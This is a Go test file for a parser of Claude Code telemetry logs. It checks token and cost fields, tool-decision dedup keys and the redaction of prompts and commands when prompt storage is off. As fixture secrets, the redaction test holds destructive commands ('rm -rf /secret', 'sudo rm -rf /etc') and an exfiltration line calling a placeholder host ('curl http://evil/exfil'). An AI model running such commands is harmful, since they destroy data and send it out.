package otel

import (
	"strings"
	"testing"
)

// Golden: api_request event → APIRequest with token breakdown, cost, duration;
// session token_source pinned to "events".
func TestLogs_APIRequestTokens(t *testing.T) {
	p := NewParser(Options{})
	res := resource(kv("session.id", strVal("s1")))
	b, rej := p.ParseLogs(logsReq(res,
		logRecord("claude_code.api_request", 5_000_000_000,
			kv("session.id", strVal("s1")),
			kv("model", strVal("claude-opus")),
			kv("input_tokens", intVal(1200)),
			kv("output_tokens", intVal(340)),
			kv("cache_read_tokens", intVal(50)),
			kv("cache_creation_tokens", intVal(7)),
			kv("cost_usd", dblVal(0.0231)),
			kv("duration_ms", intVal(875)),
		),
	))
	if rej.Rejected != 0 {
		t.Fatalf("unexpected reject: %+v", rej)
	}
	if len(b.APIRequests) != 1 {
		t.Fatalf("expected 1 api_request, got %d", len(b.APIRequests))
	}
	ar := b.APIRequests[0]
	if ar.Model != "claude-opus" || ar.Tokens.Input != 1200 || ar.Tokens.Output != 340 ||
		ar.Tokens.CacheRead != 50 || ar.Tokens.CacheCreation != 7 {
		t.Fatalf("token breakdown wrong: %+v", ar)
	}
	if ar.CostUSD != 0.0231 || ar.DurationMS != 875 || ar.IsError {
		t.Fatalf("cost/duration/error wrong: %+v", ar)
	}
	if ar.TS != 5000 {
		t.Fatalf("ts should be 5000ms, got %d", ar.TS)
	}
	if ar.DedupKey == "" {
		t.Fatalf("dedup_key must be set")
	}
	if len(b.Sessions) != 1 || b.Sessions[0].TokenSource != "events" || !b.Sessions[0].HasEvents {
		t.Fatalf("session token_source must be 'events' and has_events true: %+v", b.Sessions)
	}
}

// Golden: api_error event → APIRequest with IsError and status code.
func TestLogs_APIError(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.api_error", 6_000_000_000,
			kv("session.id", strVal("s1")),
			kv("model", strVal("claude-sonnet")),
			kv("status_code", intVal(429)),
			kv("error", strVal("rate_limited")),
		),
	))
	if len(b.APIRequests) != 1 {
		t.Fatalf("expected 1 record, got %d", len(b.APIRequests))
	}
	ar := b.APIRequests[0]
	if !ar.IsError || ar.StatusCode != 429 {
		t.Fatalf("api_error mapping wrong: %+v", ar)
	}
}

// Golden: tool_decision accept / reject / source variants.
func TestLogs_ToolDecision(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(resource(kv("session.id", strVal("s1"))),
		logRecord("claude_code.tool_decision", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("decision", strVal("accept")),
			kv("source", strVal("user")), kv("tool_name", strVal("Bash"))),
		logRecord("claude_code.tool_decision", 2_000_000_000,
			kv("session.id", strVal("s1")), kv("decision", strVal("reject")),
			kv("source", strVal("config")), kv("tool_name", strVal("Edit"))),
		logRecord("claude_code.tool_decision", 3_000_000_000,
			kv("session.id", strVal("s1")), kv("decision", strVal("accept")),
			kv("source", strVal("auto")), kv("tool_name", strVal("Read"))),
	))
	if len(b.ToolDecisions) != 3 {
		t.Fatalf("expected 3 tool_decisions, got %d", len(b.ToolDecisions))
	}
	want := []struct{ decision, source, tool string }{
		{"accept", "user", "Bash"},
		{"reject", "config", "Edit"},
		{"accept", "auto", "Read"},
	}
	for i, w := range want {
		td := b.ToolDecisions[i]
		if td.Decision != w.decision || td.Source != w.source || td.ToolName != w.tool {
			t.Fatalf("decision %d wrong: got %+v want %+v", i, td, w)
		}
		if td.DedupKey == "" {
			t.Fatalf("decision %d missing dedup_key", i)
		}
	}
	// distinct (tool, decision, source) → distinct dedup keys
	if b.ToolDecisions[0].DedupKey == b.ToolDecisions[1].DedupKey {
		t.Fatalf("distinct decisions must have distinct dedup keys")
	}
}

// Golden: tool_result with nested tool_parameters JSON → bash_command decoded;
// mcp_server decoded from a separate result.
func TestLogs_ToolResultNestedParams(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(resource(kv("session.id", strVal("s1"))),
		logRecord("claude_code.tool_result", 1_000_000_000,
			kv("session.id", strVal("s1")),
			kv("tool_name", strVal("Bash")),
			kv("success", boolVal(true)),
			kv("duration_ms", intVal(42)),
			kv("tool_parameters", strVal(`{"bash_command":"ls -la","timeout":5000}`)),
		),
		logRecord("claude_code.tool_result", 2_000_000_000,
			kv("session.id", strVal("s1")),
			kv("tool_name", strVal("mcp__github")),
			kv("success", boolVal(false)),
			kv("tool_parameters", strVal(`{"mcp_server":"github","method":"list_repos"}`)),
		),
	))
	if len(b.ToolResults) != 2 {
		t.Fatalf("expected 2 tool_results, got %d", len(b.ToolResults))
	}
	tr0 := b.ToolResults[0]
	if tr0.BashCommand != "ls -la" || !tr0.Success || tr0.DurationMS != 42 {
		t.Fatalf("tool_result[0] decode wrong: %+v", tr0)
	}
	tr1 := b.ToolResults[1]
	if tr1.MCPServer != "github" || tr1.Success {
		t.Fatalf("tool_result[1] decode wrong: %+v", tr1)
	}
}

// tool_parameters with full_command fallback (no bash_command key).
func TestLogs_ToolResultFullCommandFallback(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.tool_result", 1_000_000_000,
			kv("session.id", strVal("s1")),
			kv("tool_name", strVal("Bash")),
			kv("tool_parameters", strVal(`{"full_command":"git status -sb"}`)),
		),
	))
	if b.ToolResults[0].BashCommand != "git status -sb" {
		t.Fatalf("full_command fallback failed: %+v", b.ToolResults[0])
	}
}

// --no-store-prompts masks bash commands and user prompts but keeps the record.
func TestLogs_NoStorePromptsMasking(t *testing.T) {
	p := NewParser(Options{NoStorePrompts: true})
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.tool_result", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("tool_name", strVal("Bash")),
			kv("tool_parameters", strVal(`{"bash_command":"rm -rf /secret"}`))),
		logRecord("claude_code.user_prompt", 2_000_000_000,
			kv("session.id", strVal("s1")), kv("prompt", strVal("my secret prompt")),
			kv("prompt_length", intVal(16))),
	))
	if b.ToolResults[0].BashCommand != maskedValue {
		t.Fatalf("bash_command must be masked, got %q", b.ToolResults[0].BashCommand)
	}
	// user_prompt stored as Event with prompt attr masked.
	var found bool
	for _, e := range b.Events {
		if e.Name == EventUserPrompt {
			found = true
			if strings.Contains(e.AttrsJSON, "my secret prompt") {
				t.Fatalf("prompt text leaked into attrs_json: %s", e.AttrsJSON)
			}
			if !strings.Contains(e.AttrsJSON, "prompt_length") {
				t.Fatalf("non-sensitive prompt_length should remain: %s", e.AttrsJSON)
			}
		}
	}
	if !found {
		t.Fatalf("user_prompt event missing")
	}
}

// C1 regression: --no-store-prompts must redact the RAW sensitive attributes in
// AttrsJSON, not only the extracted BashCommand column. The original
// tool_parameters / command / full_command / bash_command / prompt keys must be
// "[redacted]" in every record's attrs_json (tool_result, tool_decision,
// api_request, and generic events), while non-sensitive keys survive.
func TestLogs_NoStorePromptsRedactsAttrsJSON(t *testing.T) {
	p := NewParser(Options{NoStorePrompts: true})
	const secretBash = "rm -rf /secret"
	const secretFull = "sudo rm -rf /etc"
	const secretPrompt = "my secret prompt about passwords"
	const secretCmd = "curl http://evil/exfil"

	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.tool_result", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("tool_name", strVal("Bash")),
			kv("tool_parameters", strVal(`{"bash_command":"`+secretBash+`"}`)),
			kv("bash_command", strVal(secretBash)),
			kv("full_command", strVal(secretFull)),
			kv("command", strVal(secretCmd))),
		logRecord("claude_code.tool_decision", 2_000_000_000,
			kv("session.id", strVal("s1")), kv("decision", strVal("accept")),
			kv("source", strVal("user")), kv("tool_name", strVal("Bash")),
			kv("command", strVal(secretCmd))),
		logRecord("claude_code.api_request", 3_000_000_000,
			kv("session.id", strVal("s1")), kv("model", strVal("claude-opus")),
			kv("prompt", strVal(secretPrompt))),
		logRecord("claude_code.user_prompt", 4_000_000_000,
			kv("session.id", strVal("s1")), kv("prompt", strVal(secretPrompt)),
			kv("prompt_length", intVal(32))),
		// An UNCLASSIFIED event that still carries a raw command must be redacted.
		logRecord("claude_code.some_future_event", 5_000_000_000,
			kv("session.id", strVal("s1")), kv("full_command", strVal(secretFull))),
	))

	secrets := []string{secretBash, secretFull, secretPrompt, secretCmd}
	assertNoSecret := func(label, attrsJSON string) {
		for _, sec := range secrets {
			if strings.Contains(attrsJSON, sec) {
				t.Fatalf("%s attrs_json leaked secret %q: %s", label, sec, attrsJSON)
			}
		}
		if !strings.Contains(attrsJSON, maskedValue) {
			t.Fatalf("%s attrs_json should contain redaction marker: %s", label, attrsJSON)
		}
	}

	if len(b.ToolResults) != 1 {
		t.Fatalf("expected 1 tool_result, got %d", len(b.ToolResults))
	}
	if b.ToolResults[0].BashCommand != maskedValue {
		t.Fatalf("tool_result bash_command column must be masked, got %q", b.ToolResults[0].BashCommand)
	}
	assertNoSecret("tool_result", b.ToolResults[0].AttrsJSON)

	if len(b.ToolDecisions) != 1 {
		t.Fatalf("expected 1 tool_decision, got %d", len(b.ToolDecisions))
	}
	assertNoSecret("tool_decision", b.ToolDecisions[0].AttrsJSON)

	if len(b.APIRequests) != 1 {
		t.Fatalf("expected 1 api_request, got %d", len(b.APIRequests))
	}
	// api_request keeps non-sensitive model but redacts the prompt.
	if !strings.Contains(b.APIRequests[0].AttrsJSON, "claude-opus") {
		t.Fatalf("api_request should keep non-sensitive model: %s", b.APIRequests[0].AttrsJSON)
	}
	assertNoSecret("api_request", b.APIRequests[0].AttrsJSON)

	// Generic events: user_prompt + the unclassified event.
	var prompt, future string
	for _, e := range b.Events {
		switch e.Name {
		case EventUserPrompt:
			prompt = e.AttrsJSON
		case "some_future_event":
			future = e.AttrsJSON
		}
	}
	if prompt == "" || future == "" {
		t.Fatalf("expected both generic events, got %+v", b.Events)
	}
	assertNoSecret("user_prompt", prompt)
	if !strings.Contains(prompt, "prompt_length") {
		t.Fatalf("user_prompt must keep non-sensitive prompt_length: %s", prompt)
	}
	assertNoSecret("unclassified_event", future)
}

// C1: with prompts ENABLED (default), the raw sensitive values must be preserved
// verbatim (no over-redaction).
func TestLogs_StorePromptsKeepsRawAttrs(t *testing.T) {
	p := NewParser(Options{}) // NoStorePrompts == false
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.tool_result", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("tool_name", strVal("Bash")),
			kv("tool_parameters", strVal(`{"bash_command":"ls -la"}`)),
			kv("bash_command", strVal("ls -la"))),
	))
	if b.ToolResults[0].BashCommand != "ls -la" {
		t.Fatalf("bash_command must be preserved when prompts enabled, got %q", b.ToolResults[0].BashCommand)
	}
	if !strings.Contains(b.ToolResults[0].AttrsJSON, "ls -la") {
		t.Fatalf("raw bash_command must be preserved in attrs_json: %s", b.ToolResults[0].AttrsJSON)
	}
	if strings.Contains(b.ToolResults[0].AttrsJSON, maskedValue) {
		t.Fatalf("must not redact when prompts enabled: %s", b.ToolResults[0].AttrsJSON)
	}
}

// Golden: unclassified event name falls back to a generic Event with the
// prefix-normalized name preserved.
func TestLogs_UnclassifiedFallback(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.some_future_event", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("foo", strVal("bar"))),
		// event.name attribute fallback (no LogRecord.EventName)
		logRecord("", 2_000_000_000,
			kv("session.id", strVal("s1")), kv("event.name", strVal("claude_code.another_event"))),
	))
	if len(b.Events) != 2 {
		t.Fatalf("expected 2 generic events, got %d", len(b.Events))
	}
	if b.Events[0].Name != "some_future_event" {
		t.Fatalf("prefix must be stripped, got %q", b.Events[0].Name)
	}
	if b.Events[1].Name != "another_event" {
		t.Fatalf("event.name fallback failed, got %q", b.Events[1].Name)
	}
}

// mcp_server_connection is a generic Event (name preserved), and session
// has_events is set even without api_request.
func TestLogs_MCPServerConnectionEvent(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(nil,
		logRecord("claude_code.mcp_server_connection", 1_000_000_000,
			kv("session.id", strVal("s1")), kv("server_name", strVal("github"))),
	))
	if len(b.Events) != 1 || b.Events[0].Name != EventMCPServerConnection {
		t.Fatalf("mcp_server_connection mapping wrong: %+v", b.Events)
	}
	if len(b.Sessions) != 1 || !b.Sessions[0].HasEvents {
		t.Fatalf("has_events must be set: %+v", b.Sessions)
	}
}

// session.id resolved from resource when absent on the record.
func TestLogs_SessionIDResourceFallback(t *testing.T) {
	p := NewParser(Options{})
	b, _ := p.ParseLogs(logsReq(resource(kv("session.id", strVal("res-sess"))),
		logRecord("claude_code.user_prompt", 1_000_000_000, kv("prompt_length", intVal(5))),
	))
	if len(b.Events) != 1 || b.Events[0].SessionID != "res-sess" {
		t.Fatalf("session.id resource fallback failed: %+v", b.Events)
	}
}

// Re-sent identical log record yields identical dedup_key (idempotency).
func TestLogs_ResendDedupKeyStable(t *testing.T) {
	p := NewParser(Options{})
	mk := func() (string, string) {
		b, _ := p.ParseLogs(logsReq(nil,
			logRecord("claude_code.tool_decision", 9_000_000_000,
				kv("session.id", strVal("s1")), kv("decision", strVal("accept")),
				kv("source", strVal("user")), kv("tool_name", strVal("Bash")))))
		return b.ToolDecisions[0].DedupKey, b.ToolDecisions[0].DedupKey
	}
	k1, _ := mk()
	k2, _ := mk()
	if k1 != k2 {
		t.Fatalf("re-send dedup_key must be stable: %s != %s", k1, k2)
	}
}
